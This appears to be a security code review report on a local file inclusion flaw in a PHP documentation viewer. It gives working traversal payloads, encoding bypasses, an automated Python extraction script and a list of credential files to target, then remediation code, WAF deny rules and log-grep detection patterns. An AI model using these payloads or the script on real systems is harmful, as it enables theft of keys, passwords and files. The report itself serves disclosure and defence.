# Security Code Review Report

## Target Information
- **Domain**: docs.example.com
- **Review Date**: 2024-11-12
- **Reviewer**: Security Team
- **Repository**: https://github.com/example/documentation-portal
- **Commit Hash**: 7e4a9b2d6f3c8e1a5b9d2f7a4c8e6b3d9f5a2c7e

---

## Executive Summary

This report identifies a critical Local File Inclusion (LFI) vulnerability in the documentation portal at docs.example.com. The vulnerability allows attackers to read arbitrary files from the server filesystem, potentially exposing sensitive configuration files, source code, and credentials.

---

## Vulnerability Details

### 1. Local File Inclusion in Document Viewer

**Severity**: CRITICAL
**CWE**: CWE-22 (Path Traversal), CWE-98 (PHP File Inclusion)
**CVSS Score**: 8.6
**File**: `includes/document_viewer.php:12`
**Git Commit**: 7e4a9b2d6f3c8e1a5b9d2f7a4c8e6b3d9f5a2c7e

#### Description
The document viewer functionality accepts a `file` parameter to display documentation files. The application fails to properly sanitize this input, allowing directory traversal sequences to access files outside the intended directory.

#### Vulnerable Code
```php
<?php
// includes/document_viewer.php

$doc_file = $_GET['file'] ?? 'index.md';
$docs_path = '/var/www/docs.example.com/public/docs/';

// VULNERABLE: Insufficient path sanitization
$file_path = $docs_path . $doc_file;

if (file_exists($file_path)) {
    // VULNERABLE: Direct file inclusion
    $content = file_get_contents($file_path);

    // Render markdown to HTML
    echo markdown_to_html($content);
} else {
    echo "Document not found";
}
?>
```

#### Proof of Concept

**1. Basic Directory Traversal:**
```bash
# Read /etc/passwd
curl "https://docs.example.com/view.php?file=../../../../etc/passwd"

# Read application configuration
curl "https://docs.example.com/view.php?file=../../../../var/www/docs.example.com/config/database.php"

# Read web server configuration
curl "https://docs.example.com/view.php?file=../../../../etc/apache2/sites-enabled/docs.example.com.conf"
```

**2. Access Sensitive Files:**
```bash
# Read environment variables
curl "https://docs.example.com/view.php?file=../../../../var/www/.env"

# Read SSH private keys
curl "https://docs.example.com/view.php?file=../../../../home/www-data/.ssh/id_rsa"

# Read application source code
curl "https://docs.example.com/view.php?file=../../../../var/www/docs.example.com/index.php"

# Read PHP configuration
curl "https://docs.example.com/view.php?file=../../../../etc/php/7.4/apache2/php.ini"

# Read MySQL credentials
curl "https://docs.example.com/view.php?file=../../../../var/www/docs.example.com/config/database.php"
```

**3. Log File Access:**
```bash
# Apache access logs (may contain session tokens)
curl "https://docs.example.com/view.php?file=../../../../var/log/apache2/access.log"

# Application logs
curl "https://docs.example.com/view.php?file=../../../../var/www/docs.example.com/logs/app.log"

# System logs
curl "https://docs.example.com/view.php?file=../../../../var/log/syslog"
```

**4. Null Byte Bypass (older PHP versions < 5.3.4):**
```bash
# Bypass extension checks with null byte
curl "https://docs.example.com/view.php?file=../../../../etc/passwd%00.md"
```

**5. URL Encoding Bypass:**
```bash
# Double URL encoding
curl "https://docs.example.com/view.php?file=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"

# UTF-8 encoding
curl "https://docs.example.com/view.php?file=..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
```

**6. Automated Exploitation Script:**
```python
#!/usr/bin/env python3
import requests
import sys

target = "https://docs.example.com/view.php"

# Files to extract
sensitive_files = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../var/www/.env",
    "../../../../var/www/docs.example.com/config/database.php",
    "../../../../home/www-data/.ssh/id_rsa",
    "../../../../var/log/apache2/access.log",
    "../../../../proc/self/environ",
    "../../../../var/www/docs.example.com/composer.json",
]

for file in sensitive_files:
    try:
        r = requests.get(target, params={'file': file}, timeout=5)
        if r.status_code == 200 and len(r.text) > 0:
            print(f"[+] Successfully read: {file}")
            print(f"Content preview: {r.text[:200]}")
            print("-" * 80)

            # Save to file
            filename = file.split('/')[-1]
            with open(f"extracted_{filename}", 'w') as f:
                f.write(r.text)
    except Exception as e:
        print(f"[-] Failed to read {file}: {str(e)}")
```

#### Attack Scenario Example

1. Attacker discovers LFI vulnerability
2. Extracts database configuration:
   ```bash
   curl "https://docs.example.com/view.php?file=../../../../var/www/config/database.php"
   ```
   Response:
   ```php
   <?php
   $db_host = 'localhost';
   $db_user = 'docs_admin';
   $db_pass = 'Super$ecret123!';
   $db_name = 'documentation';
   ?>
   ```
3. Uses credentials to access database directly
4. Extracts all user data and admin credentials
5. Escalates to full application compromise

#### Impact
- **Credential Theft**: Database passwords, API keys, SSH keys
- **Source Code Disclosure**: Application logic and algorithms
- **Session Hijacking**: Access tokens from log files
- **Information Disclosure**: System configuration, user data
- **Privilege Escalation**: Admin credentials, internal IPs
- **Further Attacks**: Use gathered info for SQL injection, RCE

#### Common Sensitive Files to Target

```
# Configuration files
/var/www/.env
/var/www/html/config.php
/var/www/html/wp-config.php (WordPress)
/var/www/html/.git/config

# Credentials
/home/user/.ssh/id_rsa
/root/.ssh/id_rsa
/home/user/.aws/credentials
/home/user/.bash_history

# System files
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/mysql/my.cnf
/etc/apache2/sites-enabled/000-default.conf

# Logs (may contain session tokens)
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/mysql/error.log

# Process information
/proc/self/environ
/proc/self/cmdline
/proc/self/status
/proc/version
```

#### Remediation

**Secure Implementation:**

```php
<?php
// includes/document_viewer.php - SECURE VERSION

$doc_file = $_GET['file'] ?? 'index.md';

// 1. Whitelist allowed file extensions
$allowed_extensions = ['md', 'txt', 'html'];
$extension = strtolower(pathinfo($doc_file, PATHINFO_EXTENSION));

if (!in_array($extension, $allowed_extensions)) {
    http_response_code(403);
    die('Invalid file type');
}

// 2. Remove any directory traversal sequences
$doc_file = str_replace(['../', '..\\', '../', './', '~'], '', $doc_file);
$doc_file = basename($doc_file); // Get filename only, removes paths

// 3. Use whitelist of allowed files (best approach)
$allowed_files = [
    'index.md',
    'getting-started.md',
    'api-reference.md',
    'faq.md',
    'changelog.md'
];

if (!in_array($doc_file, $allowed_files)) {
    http_response_code(404);
    die('Document not found');
}

// 4. Use realpath() to resolve and validate path
$docs_path = '/var/www/docs.example.com/public/docs/';
$file_path = realpath($docs_path . $doc_file);

// 5. Ensure the resolved path is within the allowed directory
if ($file_path === false || strpos($file_path, realpath($docs_path)) !== 0) {
    http_response_code(403);
    die('Access denied');
}

// 6. Verify file exists and is readable
if (!is_file($file_path) || !is_readable($file_path)) {
    http_response_code(404);
    die('Document not found');
}

// 7. Read and render file
$content = file_get_contents($file_path);
echo markdown_to_html($content);
?>
```

**Alternative Approach - Use Database:**

```php
<?php
// Store documents in database instead of filesystem

$doc_id = intval($_GET['id'] ?? 0);

$stmt = $pdo->prepare("SELECT title, content FROM documents WHERE id = ? AND published = 1");
$stmt->execute([$doc_id]);
$doc = $stmt->fetch();

if (!$doc) {
    http_response_code(404);
    die('Document not found');
}

echo "<h1>" . htmlspecialchars($doc['title']) . "</h1>";
echo markdown_to_html($doc['content']);
?>
```

---

## Additional Findings

### 2. PHP Error Messages Expose Full Paths

**Severity**: MEDIUM
**File**: `php.ini`

PHP displays full file paths in error messages, aiding attackers in exploitation.

**Remediation:**
```ini
; php.ini
display_errors = Off
display_startup_errors = Off
log_errors = On
error_log = /var/log/php_errors.log
```

### 3. Directory Listing Enabled

**Severity**: LOW
**File**: Apache configuration

Directory listing allows enumeration of documentation files.

**Remediation:**
```apache
# .htaccess
Options -Indexes
```

---

## Web Application Firewall (WAF) Rules

```apache
# ModSecurity rules to block LFI attempts
SecRule ARGS "@contains ../" "id:1001,phase:2,deny,status:403,msg:'Path Traversal Attack'"
SecRule ARGS "@contains ..\"" "id:1002,phase:2,deny,status:403,msg:'Path Traversal Attack'"
SecRule ARGS "@pm /etc/passwd /etc/shadow /etc/hosts" "id:1003,phase:2,deny,status:403,msg:'LFI Attack'"
SecRule ARGS "@rx (?:etc/(?:passwd|shadow|hosts)|var/www|proc/self)" "id:1004,phase:2,deny,status:403,msg:'LFI Attack'"
```

---

## Recommendations

1. **Immediate Actions** (within 4 hours):
   - Implement file whitelist approach
   - Add path validation using realpath()
   - Disable PHP error display
   - Review logs for exploitation attempts
   - Change compromised credentials if any

2. **Short-term Actions** (within 1 week):
   - Migrate documents to database
   - Implement WAF rules
   - Add input validation middleware
   - Conduct full source code review
   - Implement least privilege for web server

3. **Long-term Improvements**:
   - Use secure coding framework
   - Implement automated security testing
   - Regular penetration testing
   - Security awareness training
   - Adopt principle of least privilege
   - File system permissions hardening

---

## Detection Methods

**Check for LFI exploitation in logs:**
```bash
# Look for directory traversal patterns
grep -E "\.\./|\.\.%2F|\.\.\\|%252e%252e" /var/log/apache2/access.log

# Look for sensitive file access
grep -E "etc/passwd|etc/shadow|\.ssh|\.env|wp-config" /var/log/apache2/access.log

# Check for null byte attempts
grep "%00" /var/log/apache2/access.log
```

---

## Timeline
- **Discovery**: 2024-11-10
- **Verification**: 2024-11-11
- **Report Delivered**: 2024-11-12
- **Expected Fix**: IMMEDIATE (within 24 hours)

---

## References
- OWASP Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal
- CWE-22: https://cwe.mitre.org/data/definitions/22.html
- CWE-98: https://cwe.mitre.org/data/definitions/98.html
- PHP File Inclusion: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
